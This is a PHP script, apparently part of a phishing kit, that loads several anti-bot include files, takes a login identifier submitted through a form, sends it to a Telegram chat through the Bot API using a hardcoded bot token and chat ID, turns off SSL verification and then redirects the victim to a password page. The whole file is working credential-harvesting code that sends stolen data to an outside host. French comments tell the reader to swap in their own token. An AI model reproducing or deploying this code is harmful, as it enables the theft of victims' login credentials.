<?php

include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';



// Récupération des données envoyées via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userInput = htmlspecialchars($_POST['userInput']);

    // Vérification si le champ est vide
    if (empty($userInput)) {
        die('Identifiant non fourni.');
    }

    // Configuration Telegram
    $telegramBotToken = '8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ'; // Remplacez par le token de votre bot Telegram
    $chatID = '7504064689'; // Remplacez par l'ID de votre chat ou groupe Telegram

    // Message à envoyer
    $message = "Nouvel identifiant reçu :\n" . $userInput;

    // URL de l'API Telegram
    $telegramAPI = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";

    // Configuration des données à envoyer
    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
    ];

    // Envoi de la requête
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Désactivation de la vérification SSL (attention, ceci est une solution temporaire)
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Erreur de connexion à Telegram : ' . curl_error($ch);
    } else {
        header("Location: ../password.php");
    exit;
    }
}
?>
